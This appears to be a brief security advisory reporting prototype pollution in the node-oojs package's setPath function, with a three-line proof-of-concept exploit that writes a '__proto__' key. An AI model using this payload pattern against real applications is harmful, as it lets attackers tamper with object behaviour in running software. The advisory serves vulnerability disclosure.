# Overview

`node-oojs` is an Object Oriented JavaScript, this package is vulnerable to Prototype Pollution via the `setPath` function.

# Proof of Concept
```
require('node-oojs');
oojs.setPath({'__proto__.polluted':true});
console.log(polluted);
```